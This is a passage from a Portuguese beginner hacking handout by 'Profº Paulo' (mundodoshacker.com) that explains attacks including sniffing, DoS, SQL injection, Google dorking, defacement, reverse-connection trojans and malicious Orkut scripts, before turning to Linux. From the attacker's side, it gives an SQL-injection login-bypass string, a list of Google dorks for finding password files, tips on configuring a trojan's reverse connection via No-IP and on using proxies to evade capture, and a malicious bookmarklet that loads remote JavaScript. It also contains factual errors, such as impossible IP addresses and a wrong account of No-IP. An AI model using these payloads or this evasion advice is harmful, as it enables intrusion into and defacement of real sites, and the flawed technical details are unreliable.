+sites visitados, e-mails, arquivos importantes, etc. A ação do sniffer é impercebível, 
+você nem percebe que esta sendo “roubado”, o que o Sniffer faz é basicamente entrar 
+no meio do fluxo de dados da rede, e agarrar todos os protocolos e trazer para o 
+Hacker, o resultado é um simples bloco de notas (depende do sniffer e da escolha do 
+Hacker) com as informações roubadas em forma de texto, ou seja não é nada difícil de 
+entender o que a vitima esta fazendo.
+ “Ainda” não existe nenhum programa que protege uma rede 100% de ataques 
+com sniffers, o que chega perto da proteção de ataques desse tipo é o “Firewall”, mas 
+mesmo com um firewall uma rede pode perfeitamente ser vitima de sniffing.
+www.mundodoshacker.com pagina. 60 Apostila Para Hackers Iniciantes > Spoofing Profº Paulo
+ Spoofing é uma técnica interessante, o Hacker faz-se passar por um host 
+confiável para ter acesso a um computador com acesso restrito. Basicamente o 
+Hacker tem que achar um IP de um host confiável, usa-lo a seu beneficio próprio e 
+fazer com que o receptor ache que ele é o host confiável, dessa forma ele terá acesso 
+ao PC alvo. Voltando a festa do firewall (capitulo 2) o que o spoofing faz é disfarçar o 
+invasor de forma que ele pareça um convidado ou até mesmo o dono da festa, para 
+que ele possa então passar pelo segurança e ter acesso a festa. O spoofing pode ser 
+considerado a Mística (X MAN) do Hacking :D!!! Desse jeito até um elefante entra na 
+festa não é :D?
+www.mundodoshacker.com pagina. 61 Apostila Para Hackers Iniciantes > DOS (Denial of Service) Profº Paulo
+ Esse não é o DOS do MS-DOS! O DOS (Denial of Service/ Negação de Serviço) 
+é uma técnica de ataque a servidores, esse ataque tem como objetivo inutilizar o 
+servidor alvo, de forma que ele não possa ser acessado por nenhum de seus 
+usuários, esse ataque não é nada produtivo, quem pratica esse tipo de ataque não 
+consegue roubar senhas, nem contas, apenas consegue deixar o servidor inutilizável 
+“por um tempo”, é a famosa “BIRRA”: “Eu não quero acessar, então ninguém mais 
+acessa” :D!
+ Os alvos principais dos autores desses ataques, são os servidores Web (capitulo 
+4), afinal os servidores Web são os mais visitados pelos usuários de Internet, dessa 
+forma o ataque não passaria desapercebido, afinal quem pratica um ataque desse 
+porte sem dúvida quer chamar atenção. Para você ter uma idéia do resultado desse 
+ataque imagine inutilizar o Orkut por um dia, isso seria um verdadeiro caos, tem gente 
+que é doido por Orkut :D (só foi um exemplo), agora imagine inutilizar um servidor web
+de uma empresa que depende do site para lucrar, seria sem duvida um grande 
+prejuízo, mesmo se o ataque durasse apenas algumas horas.
+ O que o ataque DOS (Denial of Service) faz é basicamente sobrecarregar o PC 
+servidor, consumindo todos os seus recursos como: memória e processador, dessa 
+forma o servidor (computador) ficara lento ou terá até que reiniciar, dessa forma fica 
+inutilizável pelos seus usuários, é a mesma coisa que você abrir um monte de 
+programas no seu computador como: média player, Internet Explorer, MSN, Nero, 
+Antivírus, anti spyware, Word, Excel, Photo Shop, Need For Speed Carbom... e ai vai, 
+o seu computador iria ficar tão lento que se você fosse abrir mais um programa, esse 
+programa só seria aberto quando você tivesse 100 anos :D, isso se o seu computador 
+não reiniciaria é claro :D.
+ Alem dos ataques DOS tem ainda os ataques DDOS, os ataques DDOS tem o 
+mesmo objetivo do ataque DOS só que é bem mais: forte, preparado e eficaz. O 
+ataque DDOS não parte apenas do computador do Cracker, e sim também de outros 
+computadores chamados de “zumbis”, para fazer isso o cracker infecta outros 
+www.mundodoshacker.com pagina. 62 Apostila Para Hackers Iniciantes > DOS (Denial of Service) Profº Paulo
+computadores com um trojan, dessa forma ele pode ter controle do PC da vitima e 
+ordenar ataques simultâneos ao servidor alvo, exemplo: seria como 5 computadores 
+lançando um ataque DOS ao mesmo servidor ao mesmo tempo, já pensou ? Se só um 
+computador já consegue fazer um estrago, imagine 5.
+www.mundodoshacker.com pagina. 63 Apostila Para Hackers Iniciantes > SPAM Profº Paulo
+ Quem nunca foi vitima de SPAM? SPAM são aquelas mensagens chatas de 
+propagandas, que na maioria das vezes tentam te influenciar a acessar um 
+determinado site, na grande maioria as mensagens vem também com imagens do tipo 
+tentadoras, essas mensagens nunca vem sozinhas, pode ter certeza de que quando 
+chega uma dessas, vai vir outra e outra e outra, até que você bloqueei o e-mail que 
+esta enviando a mensagem ou o denuncie. Normalmente as mensagens de SPAM 
+são enviadas em massa ou seja, pode ser varias mensagens para um só e-mail, ou 
+pode ser a mesma mensagens para vários e-mails, isso é possível com o uso de 
+programas específicos para SPAM, eles possibilitam que uma mensagem possa ser 
+enviada para vários e-mails sem que você tenha que fazer aquele processo demorado 
+de: “assunto”, “e-mail de destino” e “mensagem”, o que você tem que fazer é apenas 
+colocar vários e-mails no programa, e manda-lo enviar a mensagem para todos e-
+mails de uma só vez.
+ Na maioria das vezes os SPAMs são enviados por empresas comerciais, com o 
+intuito de manipular o cliente e faze-lo a adquirir um determinado produto, ou a 
+acessar um determinado site, é a velha técnica de marketing, mas existem também 
+SPAMs que não tem nenhuma finalidade, só apenas para encher a sua caixa de e-
+mail. Fora os dois tipos de SPAM citados temos também os do tipo Hacker, esses são 
+mensagens também enviadas em massa que influencia o dono da conta do e-mail a 
+baixar um arquivo (você até imagina o que tem nesse arquivo não é :D), alguns 
+desses SPAM são mais preparados, outros nem tanto, é mais ou menos assim: o 
+SPAM bem preparado tenta esconder o verdadeiro motivo da mensagem, que é fazer 
+o usuários do e-mail baixar o vírus e se infectar, isso é feito com imagens e uma 
+mensagem tentadora; O SPAM mau preparado é aqueles que só falta colocar um 
+braço para fora do monitor e obrigar o usuário a clicar no link, esses dificilmente 
+conseguem alguma coisa :D.
+ Para identificar um SPAM malicioso não é muito difícil (dependendo do 
+mensagem), um bom exemplo é uma mensagem que foi mandada em massa (SPAM)
+a um tempo atrás:
+A mensagem dizia que a Policia Federal havia constatado pelo meu numero de “IP” 
+que eu estava entrando em “sites ilícitos”, e por esse motivo eu estava sendo 
+indiciado, logo abaixo da mensagem estava uma frase que dizia o seguinte: para ler o 
+mandato baixe o arquivo abaixo: 
+www.mundodoshacker.com pagina. 64 Apostila Para Hackers Iniciantes > SPAM Profº Paulo
+ O mais tentador da mensagem era o remetente da mesma, o e-mail era o 
+seguinte: policiafederal@dpf.com.br (dpf (Departamento da Policia Federal :D), fora 
+isso é que o ícone do arquivo era do word.
+ Agora vamos identificar a fraude! 
+1º Houve um grande numero de mensagens enviadas desse tipo e a maioria das 
+pessoas que recebeu essa mensagem nunca havia entrado em sites ilícitos.
+2º A Policia Federal não iria rastrear o seu IP, a não ser que você tenha cometido um 
+crime muito grave pela Internet.
+3º Nunca que a Policia Federal iria mandar um e-mail dizendo que o individuo esta 
+indiciado, eles vão é na casa da pessoa mesmo. Já pensou se a policia manda-se um 
+e-mail para um assassino, dizendo que eles já descobriram que o dono do e-mail 
+(assassino) matou uma pessoa, e que por esse motivo é para o assassino ir até a 
+delegacia mais próxima de sua cidade para ser preso :D, o que você acha que o 
+assassino vai fazer ? Ir até a delegacia, ou correr como nunca correu na sua vida até 
+a rodoviária :D ? 
+4º hahahaha a frase dizendo que é para baixar um mandato é a pior :D. A Policia 
+nunca mandaria um mandato por e-mail e muito menos em formato “word”, pois sendo 
+em word o mandato poderia ser modificado e usado para outros fins.
+5º O e-mail do remetente realmente intriga qualquer um, mas isso não é nenhum
+problema! Pois hoje em dia qualquer um pode fazer um e-mail personalizado, quem 
+quiser pode até fazer um e-mail: nasa@nasa.com .
+Para finalizar!!! Logo que eu vi o e-mail, identifiquei a fraude eu dei um pouco de 
+risada, eu resolvi baixar o arquivo com o ícone do word que estava indexado ao e-
+mail, foi ai que eu chorei de dar risada! O arquivo tinha o ícone do word só que seu 
+formato era .exe (o formato de documentos word são: .doc), essa foi boa não é :D, e 
+adivinha o que aconteceu quando o download do arquivo terminou, você se lembra do 
+nosso amigo cavalo de tróia (trojan)? Então!! Ele resolveu me fazer uma visita :D!!! 
+Meu antivírus detectou na hora o vírus :D.
+ Eu não sei se o mandante desse SPAM comedia foi preso, por isso tome 
+cuidado ao receber um e-mail desse tipo, analise bem o e-mail, e se possível
+denuncie essa mensagem para as autoridades, afinal esta sendo usado o nome da 
+Policia Federal.
+www.mundodoshacker.com pagina. 65 Apostila Para Hackers Iniciantes > Exploits Profº Paulo
+ Os Exploits são programas de computadores como outros qualquer, que 
+obviamente são feito por programadores, no exploit há uma porção de dados ou ma 
+seqüência de comandos que tem como objetivo explorar as vulnerabilidades de um 
+sistema, com o intuito de dar o controle do sistema para o Hacker, ou Cracker. Os 
+Hackers desenvolvem exploits com a intenção de mostrar as vulnerabilidades de um 
+determinado sistema para o administrador do mesmo, para que então essa 
+vulnerabilidade possa ser corrigida. Já os Crackers fazem exploits com uma única 
+intenção, que é de invadir o sistema para obter ganho próprio.
+ A maioria dos exploits são feitos na linguagem de programação “C” e quando 
+prontos não são compilados, ou seja, a pessoa que for utiliza-lo deve usar um 
+compilador da linguagem “C” para que então possa rodar o exploit (programa). 
+ Um exploit age basicamente da seguinte forma: O Hacker executar o exploit, 
+assim que executado o exploit ira disparar uma seqüência de bytes, que serão 
+interpretados como dados pelo sistema, os bytes recebidos pelo sistema o deixara 
+propositadamente em pane, dessa forma o sistema dará controle aos próprios bytes, 
+que por acaso são uma seqüência para dominar o CPU, assim que o exploit assumi o 
+controle do PC ele ira abrir-lo para o Hacker, que aguarda na outra ponta.
+ 
+www.mundodoshacker.com pagina. 66 Apostila Para Hackers Iniciantes > SQL Injection Profº Paulo
+ SQL Injection (Structured Query Language/ Linguagem de Consulta Estruturada)
+é uma técnica de invasão de sites, em que o invasor injeta alguns comandos (string)
+na pagina de administração do mesmo, esses comandos se bem sucedidos daram
+acesso a pagina de administração do site alvo, ai você já até imagina o que pode ser 
+feito não é? Alteração de paginas, download de paginas e arquivos, alteração e/ou 
+download do banco de dados do site, e por ai vai. Mas não é tão fácil assim, é claro, 
+para que uma invasão via SQL Injection de certo é preciso que você 
+ache um site vulnerável a SQL Injection, tarefa essa que não é muito 
+difícil graças ao nosso amigo Google e os diversos scanners de sites
+disponíveis na Internet. Assim que um site vulnerável a SQL Injection 
+é achado o próximo passo é de colocar uma string em ação, por 
+exemplo a string: “ ' or'1-- "
+Essa string é colocada no local em que deve-se digitar o nome de 
+usuário e senha, no painel de administração do site alvo, caso o site 
+realmente seja vulnerável a SQL Injection, você entrará como 
+administrador do site e terá controle absoluto (dependendo do site).
+ Apesar dessa técnica já ser um pouco ultrapassada, é impressionante o numero 
+de sites vulneráveis a SQL Injection, não é como antes o numero de sites vulneráveis, 
+mas pela conscientização e formas que sempre são mostradas em fóruns de 
+webmasters, de como proteger um site dessa técnica, era de se esperar mais dos 
+administradores :D.
+ O uso da técnica SQL Injection é muito simples, e o mais importante: “Não é 
+preciso de nenhuma ferramenta especifica para efetuar a invasão (a não ser que você 
+queira usar um scanner para procurar por sites vulneráveis)” 
+ 
+www.mundodoshacker.com pagina. 67 Apostila Para Hackers Iniciantes > Google Profº Paulo
+ Você deve estar se perguntando: “Google Hacker ?”. É isso mesmo! Lembra 
+quando eu disse que tudo que foi feito para o bem também pode ser usado para o 
+mau? Então! O Google também se encaixa a essa frase :D. Alem das pesquisas de 
+trabalhos, sites, noticias,etc, o Google também pode ser usado para invasões, mais 
+especificamente invasões de sites, na verdade o Google pode até ser considerado
+como uma ferramenta de invasão, é claro que você não irá conseguir invadir qualquer 
+site com o Google, mas garanto que ele adianta e muito o lado do Hacker.
+ Como todos já devem saber o Google é o melhor site de pesquisa de toda a
+Internet, isso deve-se a sua forma eficaz de procurar e mostrar os resultados de uma 
+pesquisa feita por um de seus usuários, um bom exemplo é de quando pesquisamos 
+pela palavra “Hacker”, o resultado é mais de 190.000.000 paginas, isso acontece 
+porque o Google irá mostrar todas as paginas de sites que contenham a palavra 
+“Hacker”, exemplo: Um Hacker é uma pessoa que...,
+Revista Mundo Dos Hackers, para ser um Hacker..., 
+um Hacker se jogou do...., etc, ou seja se você estiver 
+interessado no significado da palavra Hacker ou o que 
+é ser um Hacker, não serão todas as paginas que será 
+útil para você. Para fazer uma invasão através do 
+Google, o que deve ser feito é uma “pesquisa”, mas não uma pesquisa como a citada 
+acima, e sim uma pesquisa inteligente, de forma que o Google inocentemente mostre 
+os sites vulneráveis para uma possível invasão, dependendo da pesquisa uma pessoa 
+pode até conseguir acesso direto a pagina de administração de um site ou até mesmo 
+fazer downloads de arquivos confidenciais, como por exemplo cadastros de clientes.
+ Para o Google exibir resultados favoráveis como sites vulneráveis, são usados 
+alguns códigos, muitos simples diga-se de passagem, esses códigos são como 
+comandos que fará o Google mostrar apenas o que você realmente quer saber, como 
+por exemplo: site:mundodoshackers.x-br.com , esse comando fará com que o google 
+mostre todas as paginas que estão no site www.mundodoshacker.x-br.com , outro 
+bom exemplo é se houvesse algum arquivo de texto .txt que contenha cadastro de 
+clientes do Mundo Dos Hackers, para obter esse arquivo pode ser feito uma pesquisa 
+da seguinte forma: mundodoshackers.x-br.com filetype:txt , isso fará com que o 
+google mostre todos os arquivos txt que estão no site www.mundodoshackers.x-
+br.com , inclusive o cadastro citado (Obs: Não adianta fazer essa pesquisa que não 
+www.mundodoshacker.com pagina. 68 Apostila Para Hackers Iniciantes > Google Profº Paulo
+tem cadastro nenhum :D), alem desses comandos básicos citados acima, existe 
+também os comandos mais complexos que fazem o Google mostrar por exemplo 
+senhas de sites. Abaixo uma pequena lista de comandos que podem ser usados para 
+achar sites vulneráveis no Google:
+“Index f/” + password.txt
+“Index f/” + .htaccess
+“Index of/” + passwd
+Index of ftp +.mdb allinurl:/cgi-bin/ + mailto
+administrators.pwd.index
+authors.pwd.index
+filetype:config web
+inurl:iisadmin
+inurl:“wwwroot/*”
+inurl:“ftproot/*”
+Index of/admin
+Filetype:htpasswd
+Intitle:“index of” “.htpasswd” -intitle:“dist” -apache –htpasswd.c
+Index.of.private
+intitle:index.of master.passwd
+inurl:passlist.txt
+intitle:“index of..etc” passwd
+intitle:index.of
+“Index of /admin”
+“Index of /password”
+“Index of /mail”
+“Index of /” +passwd
+administrator.pwd.index
+authors.pwd.index
+service.pwd.index
+filetype:config web
+allintitle: “index of/admin”
+allintitle: “index of/root”
+ 
+www.mundodoshacker.com pagina. 69 Apostila Para Hackers Iniciantes > Defacer Profº Paulo
+ Defacer é a pessoa que pratica Deface! Não saímos do lugar não é :D? Mas o 
+que é Deface?
+ A pratica de Deface consiste em invadir um servidor web (capitulo 4) e alterar a 
+pagina inicial de um determinado site, esse tipo de invasão pode ser feito através de 
+varias técnicas como: SQL Injection, PHP Injection, Exploit, etc, o que importa é 
+conseguir acesso a pagina de administração do site, podendo então fazer as 
+mudanças que quiser. O deface é praticado pelos “Crackers” e “Scripts Kiddies”, os 
+seus principais alvos são sites conhecidos, que tenham um grande numero de acesso 
+diário, afinal o que adianta uma pessoa pintar o 7 e ninguém perceber não é? 
+Recentemente houve dois atos de defacer que não teriam nem como passar 
+desapercebidos, que foi a invasão ao site da Rede Record de televisão e ao site do
+SBT, os atores do ataque fizeram um pequeno estrago nos sites das emissoras de 
+televisão, alterando a pagina inicial dos sites por uma com um depoimento deles, que 
+em um trecho ironicamente pedia desculpas aos administradores do site, alem desses 
+dois ataques o grupo ainda ameaçou invadir o site do plim plim (Globo), ataque esse 
+que não foi efetuado até o momento, graças ao empenho dos administradores do site.
+www.mundodoshacker.com pagina. 70 Apostila Para Hackers Iniciantes > Conexão reversa Profº Paulo
+ Você conhece aquele ditado: “Se a montanha não vai até Maomé, Maomé vai 
+até a montanha”? Quando tratamos de conexão reversa a montanha pode sim vir até 
+Maomé :D. Quando utilizamos um trojan, nos precisamos conectar o nosso PC ao PC 
+da vitima, para isso é preciso saber o numero de IP do PC da vitima, até ai tudo bem, 
+só que tem um problema, e quando a vitima se desconectar? Em conexões discadas e 
+na maioria das conexões banda larga o IP do usuário muda a cada conectada. E
+agora ? Teremos que pegar novamente o IP da vitima para acessar o PC dela. Com a 
+conexão reversa não temos esse problema, ao invés de nosso 
+PC se conectar ao PC da vitima será o PC da vitima que se 
+conectara ao nosso (não falei que a montanha poderia ir até 
+Maomé :D), dessa forma não será preciso pegar o IP da vitima 
+para poder usar o trojan.
+ Agora sim tudo beleza não é? Não!!! Como foi dito acima 
+o IP de um PC muda a cada conectada, ou seja, e quando o 
+nosso numero de IP mudar, como que o PC da vitima vai 
+conseguir se conectar ao nosso PC? É realmente não tem como! É ai que entra o 
+No-IP. O No-IP gera um IP fixo para seu PC, é claro que o IP do seu PC continuara
+mudando a cada desconectada, o IP fixo é utilizado ao você logar-se no No-IP, ai sim 
+você estará com o seu IP fixo, o que acontece é basicamente o seguinte: seu PC
+recebe o numero de IP 201.25.87.547 ao se conectar a Internet, você se conecta ao 
+No-IP, feito isso o seu IP passara a ser o seu IP fixo do No-IP exemplo: 
+203.56.87.415.
+ E agora tudo belezinha ? Agora sim!!! Agora é só configurar o trojan para se 
+conectar ao seu No-IP (IP fixo) e pronto, o PC da vitima ira se conectar sempre ao 
+numero de IP fixo.
+www.mundodoshacker.com pagina. 71 Apostila Para Hackers Iniciantes > Proxy Profº Paulo
+ Como já foi dito no capitulo 4 “pagina 49”, um servidor Proxy camufla o seu 
+endereço de IP na Interne. Em hacking o Proxy é usado na maioria das vezes para 
+pratica de deface, quando alguém invade um site seja ele qual for, o endereço de IP 
+do invasor ficara registrado no site, dessa forma o invasor corre o risco de ser pego,
+uma vez que o administrador do site tome conhecimento da invasão e do IP do 
+invasor, já utilizando Proxy o invasor terá uma chance maior de não ser pego, não é 
+100% garantido mas é bem melhor do que invadir com o seu IP a mostra para quem 
+quiser ver.
+ Alem para a pratica de deface o Proxy é utilizado também para se navegar 
+anonimamente pela Internet, podendo então acessar sites sem se preocupar com 
+possíveis problemas, se é que você me entende :D.
+ Há três maneiras de se navegar anonimamente pela internet usando Proxy, a 
+primeira é usando os sites Proxy que o redireciona para o site de sua preferência já
+com o seu IP alterado, a segunda maneira é colocando em seu navegador um numero 
+de IP de algum servidor proxy, e a terceira maneira é utilizando um programa que 
+tenha a função de alterar o IP de seu usuario. Abaixo segue um link para cada uma 
+das opções acima:
+Site Proxy: http://www.servershift.com/
+IP de Proxy: http://www.samair.ru/proxy/
+Programa Proxy “JAP”: http://superdownloads.uol.com.br/download/27/jap/
+www.mundodoshacker.com pagina. 72 Apostila Para Hackers Iniciantes > DNS Poisoning Profº Paulo
+ DNS Poisoningue é quando um arquivo de DNS é envenenado com informações 
+ruins, em outras palavras, se você tem um registro A que aponta para um host seguro, 
+um Hacker pode mudar e apontar você para uma direção errada, podemos usar como 
+exemplo um passeio com seu carro: o destino de seu carro é ir para santos SP, ai vem 
+um filho da mãe e te da uma informação errada e você acaba indo parar lá no Paraná. 
+www.mundodoshacker.com pagina. 73 Apostila Para Hackers Iniciantes > Phishing Profº Paulo
+ Phishing é uma técnica que envolve “engenharia social” (quando uma pessoa 
+tenta enganar e/ou adquirir informações pessoais usando somente a arte de enganar), 
+os Phishers tentam adquirir minuciosamente dados 
+confidenciais de usuários como: login, senhas, informações 
+de cartão de créditos, etc, é como se eles pescassem 
+informações. Para capturar essas informações os Phishers
+usam o nome de pessoas importantes e até entidades 
+confiáveis. Normalmente o Phishing é transmitido através de 
+e-mails, sendo que cada vez mais os phishers melhoram 
+suas artimanhas e técnicas para obter sucesso em seu 
+ataque.
+ Você se lembra do “SPAM comedia” (capitulo 5, pagina 
+64)? Então! Ele é um bom exemplo de Phishing.
+www.mundodoshacker.com pagina. 74 Apostila Para Hackers Iniciantes > Buffer Overflow (estouro de pilhas) Profº Paulo
+ Buffer Overflow ou estouro de pilha é um erro de programação, uma 
+vulnerabilidade em um sistema que pode resultar em um acesso incorreto ao 
+endereço da memória, causando o termino do programa, é como se os dados 
+transbordassem. Para os aproveitadores isso significa uma 
+brecha no sistema de segurança, podendo então praticar uma 
+tentativa de invasão ao sistema.
+ Um caso famoso de Buffer Overflow ocorreu em 2000 com 
+o Outlook Express, é isso mesmo o cliente de e-mail da tão 
+famosa Microsoft, graças a vulnerabilidade no programa uma 
+pessoa poderia enviar uma mensagem, que ao ser aberta pelo 
+usuário executava automaticamente um arquivo (da até para 
+imaginar que tipo de arquivo não é? :D), na época, logo que 
+esse erro foi descoberto, a Microsoft avisou todos os usuários do 
+Outlook Express sobre vulnerabilidade, e logo lançaram uma 
+correção para esse erro.
+www.mundodoshacker.com pagina. 75 Apostila Para Hackers Iniciantes > Replay Profº Paulo
+ Um ataque Replay é quando o Hacker utiliza um sniffer (capitulo 5, pagina 60)
+para capturar pacotes da rede, assim que capturado o Hacker extrai dos pacotes as 
+informações importantes como dados pessoais e senhas, logo que extraído,o Hacker 
+pode colocar os dados capturados novamente na rede ou reinicia-los. O Replay é 
+basicamente uma segunda técnica de sniffing.
+www.mundodoshacker.com pagina. 76 Apostila Para Hackers Iniciantes > Scripts Profº Paulo
+ Um script é diferente de um programa! Enquanto programas de computadores 
+são compilados em formatos .exe (executável), os scripts mantém seu formato e é 
+interpretado como comandos. Em hacking os scripts são usados de diversas formas, 
+tanto para bem quanto para o mau. Um lugar que pode ser encontrado um grande 
+numero de scripts mau intencionados é no Orkut, principalmente agora que o Orkut 
+disponibilizou mensagem com códigos HTML, quem é que nunca viu em uma 
+comunidade seja ela hacker ou não aquele tópico: “ver fotos bloqueadas”, “aumente o 
+numero de amigos”, “aumente o numero de membros da sua comu”, “mude a cor do 
+seu orkut”, entre outros, na maioria das vezes esses scripts não cumprem com o que 
+prometem, ao contrario, roubam os cookies e os envia para o dono do script, dando 
+então para o dono do script a possibilidade de uma invasão, mas quem observar bem 
+os scripts atuais, ira perceber que a nova moda é fazer uma pessoa entrar em uma 
+determinada comunidade sem que ela queira, ou seja ao usuário executar o script ele 
+automaticamente entrara em uma determinada comunidade sem pedir confirmação.
+ Não é difícil de identificar um script mau intencionado, o que deve ser feito é 
+apenas observar o script e verificar se ele o redireciona para um arquivo JAVA
+SCRIPT, caso sim basta você baixar esse arquivo JAVA (.js) e analisar seu código
+fonte. Abaixo um exemplo de um código malicioso:
+javascript:d=document;c=d.createElement('script');d.body.appendChild(c);c.src='http://
+stashbox.org/73555/recado-bloqueado-libere-o-recado.js';alert ("recados-
+desbloqueados");void(0)
+Esse script ira executar o java que esta no site: http://stashbox.org/73555/recado-
+bloqueado-libere-o-recado.js , até ai tudo bem mas olha o que esta no código fonte 
+desse java:
+www.mundodoshacker.com pagina. 77 Apostila Para Hackers Iniciantes > Scripts Profº Paulo
+time=new Date().getTime();
+document.body.innerHTML+='<iframe name="nobody1" width="1" height="1"/>';
+document.body.innerHTML+='<iframe name="nobody" width="1" height="1"/>';
+nb1=document.forms[1];
+nb1.target="nobody1";
+nb1.action='http://www.orkut.com/CommunityJoin.aspx?Action.join&cmm=47542562';
+nb1.submit();
+nb=document.forms[1];
+nb.target="nobody";
+nb.action='http://www.orkut.com/CommunityJoin.aspx?Action.join&cmm=36588742';
+nb.submit();
+Preste atenção no link das comunidades! Resumindo, ao executar esse script a 
+pessoa entrara nas comunidades acima sem nem perceber! Que covardia não é :D?
+ Outra tendência do Orkut Fashion Script é o scrap com um código HTML mau 
+intencionado que faz com quem entre na pagina de recados da vitima saia 
+automaticamente do Orkut, veja o código abaixo:
+<embed src="http://www.orkut.com/GLogin.aspx?cmd=logout"> 
+Simples não é? O que esse código faz, é só redirecionar a pessoa para a pagina de 
+logout do Orkut, em outras palavras é como se você clicasse em “sair”.
+ Não é só no Orkut que pode ser achado scripts mau intencionados, um script 
+malicioso pode ser facilmente integrado ao código fonte de um site qualquer, por isso 
+sempre fique atento nos sites que você acessa.
+www.mundodoshacker.com pagina. 78 Apostila Para Hackers Iniciantes > Brute Force Profº Paulo
+ Brute Force ou Força Bruta, é uma técnica que com a utilização de um 
+determinado programa, tenta descobrir senhas usando a força bruta , essas senhas 
+pode ser de e-mails, arquivos zipados, PDF, sites, etc. O que o programa faz é 
+basicamente, tentar todas as combinações de senhas 
+possíveis, desde a letra “A” até a “Z”, incluindo 
+combinações numéricas “0” a “9” e letras minúsculas e 
+maiúsculas, esse processo pode ser rápido levando 
+apenas uns 3 minuto para descobrir a senha ou pode 
+também ser demorado levando até 1 hora para descobrir a 
+senha, ou pode também acontecer do programa não 
+conseguir descobrir a senha, o que vai determinar o tempo 
+que o programa levara para descobrir a senha, é o 
+tamanho e o nível de segurança da senha, exemplo: se a 
+senha for: 4587 logicamente ela poderá ser descoberta rapidamente, agora se a 
+senha for paulo457895 ai a coisa já complica um pouco.
+ O processo que o programa de força bruta faz é basicamente o seguinte: O 
+hacker configura o programa para quebrar a senha seja de e-mail ou arquivo e da 
+inicio ao programa, feito isso, o programa ira tentar todas as combinações de senhas 
+possíveis, será como se você tentasse uma senha e clicasse em ok, caso a senha de 
+for errada, tentara outra combinação e clicara em ok, e assim sucessivamente, até 
+que a senha seja descoberta. Quando a senha é dada como certa o programa mostra 
+ao hacker qual a combinação de senha que deu certo, para que então o hacker possa 
+ter acesso ao arquivo ou conta de e-mail.
+www.mundodoshacker.com pagina. 79 Apostila Para Hackers Iniciantes > Nuke Profº Paulo
+ Nuke (bomba nuclear) é uma técnica de ataque que faz com que um computador
+se desconecte da internet ou até mesmo congele, fechando todos os programas e 
+processos que estavam até então em execução, obrigando o usuário do computador 
+reiniciar seu PC ou se conectar novamente a Internet, para um computador receber 
+esse tipo de ataque basta ele estar com alguns bugs 
+(vulnerabilidades) em determinadas portas e estar em rede seja 
+ela internet ou particular. 
+ Para efetuar esse tipo de ataque é preciso ter um programa 
+que cumpra a tarefa, programa esse que não é difícil de ser 
+achado, com o programa em mãos basta configura-lo 
+corretamente e nukar a vitima utilizando o endereço de IP da 
+mesma.
+ O processo de um ataque Nuke é basicamente o seguinte: Primeiramente o 
+hacker escolhe um programa nuke (eficiente é claro), assim que estiver com o 
+programa, o hacker deve configurar o mesmo, a partir daí basta o hacker escolher a 
+vitima e pegar o numero de IP da mesma (Obs: Uma vitima que tenha o computador 
+vulnerável a esse tipo de ataque), feito todo esse processo é só o hacker mandar bala, 
+o programa ira disparar uma serie de pacotes até conseguir o seu objetivo.
+www.mundodoshacker.com pagina. 80 Apostila Para Hackers Iniciantes > Capitulo 6 Profº Paulo
+www.mundodoshacker.com pagina. 81 Apostila Para Hackers Iniciantes 2008 Profº Paulo
+www.mundodoshacker.com pagina. 82 Apostila Para Hackers Iniciantes > O que é Linux? Profº Paulo
+ 
+ O Linux como o Windows é um sistema operacional, só que bem mais seguro
+diga-se de passagem. O Linux foi desenvolvido pelo Linus Torvalds, inspirado no 
+sistema “MINIX” e baseado na arquitetura UNIX o Linux é um exemplo de Sistema 
+Operacional, ele é seguro, ideal para rede, ideal para servidores, tem um design legal 
+e alem de tudo é um software livre e tem seu código fonte aberto, ou seja, ele é 
+gratuito e ainda pode ser modificado livremente por qualquer programador que tenha 
+conhecimento o suficiente para tal ação, a única coisa que os desenvolvedores 
+pedem, é que quando o programador alterar o Linux ele distribua o mesmo 
+gratuitamente e com código fonte aberto, ta bom ou quer mais :D ?
+ Em questão de rede os sistemas operacionais Linux sem
+dúvida ganham de goleada dos sistemas operacionais do 
+Windows, para você ter uma idéia o Linux consegue 
+reconhecer automaticamente uma rede, mesmo se o PC 
+servidor ou os PCs clientes serem de outro sistema 
+operacional como o Windows por exemplo, dessa forma o 
+Linux possibilita uma rede instantânea, exemplo: o Linux 
+consegue configurar sozinho o compartilhamento de acesso a 
+internet, dessa forma o Linux consegue se conectar a internet 
+sem que seja preciso configurações, basta o PC servidor estar 
+distribuindo o acesso a todos os PCs da rede. 
+ O Linux tem vários membros em sua família (varias versões), no meio dessa 
+família tem dois primos que falam a nossa língua :D (são traduzidos para a língua
+portuguesa) são eles: Kurumin, Ubuntu, Kalango, Famelix, Magnux, entre outros,
+esses são altamente recomendáveis para quem esta começando a utilizar e/ou
+interagir com o Linux, principalmente o Kurumin.
+ Como já foi dito o Linux é distribuído gratuitamente e tem o seu código fonte 
+aberto e livre para alterações, abaixo uma lista com links para downloads de alguns 
+membros dessa família que tem tudo para crescer:
+Kurumin 7: http://baixaki.ig.com.br/download/Kurumin-Linux.htm
+Fedora 5: http://superdownloads.uol.com.br/linux/distribuicoes/distro98.html
+www.mundodoshacker.com pagina. 83 Apostila Para Hackers Iniciantes > O que é Linux? Profº Paulo
+Mandriva: http://superdownloads.uol.com.br/linux/distribuicoes/distro74.html
+Ubuntu: 
+http://baixatudo.globo.com/Baixatudo/Categoria/Facilitar_e_organizar/0,,DOA28216-
+7758-Ubuntu+,00.html
+Kubuntu:
+http://baixatudo.globo.com/Baixatudo/Categoria/Seguranca_e_performance/0,,DOA30
+589-7648-KUBUNTU,00.html
+Kalango: http://superdownloads.uol.com.br/linux/distribuicoes/distro100.html
+Debian: http://cdd.debian-br.org/project/wiki/Download
+Big: http://superdownloads.uol.com.br/linux/distribuicoes/distro158.html
+Damn Small Linux: http://superdownloads.uol.com.br/linux/distribuicoes/distro99.html
+Famelix 1.2: http://www.ziggi.com.br/downloads/4969.asp
+Magnux: http://www.magnux.org/obtendo.php
+Goblinx: http://superdownloads.uol.com.br/linux/distribuicoes/distro194.html
+Obs: Caso um dos links acima esteja com problema entre em contato comigo pelo e-
+mail: paulotacio@mundodoshackers.x-br.com que eu lhe passarei um novo link.
+ Alguns dos Linux acima tem a opção Live CD, para quem não sabe isso é bom 
+:D. Os Linux Live CD proporcionam ao seu usuário a opção de rodar o Linux direto do 
+CD, ou seja, ele não precisa ser instalado para rodar, basta reiniciar o computador e 
+faze-lo dar boot pelo CD. Alem de ser rodado pelo CD o Linux também pode rodar 
+direto de um dispositivo de armazenamento com memória flash (MP3, MP4, Pen
+driver, Ipod, etc), esse meio chega até ser mais recomendável do que o CD, porem 
+para fazer o Linux rodar por um dispositivo de armazenamento já é bem mais 
+complicado do que faze-lo rodar pelo CD, a vantagem é que quando o Linux é rodado 
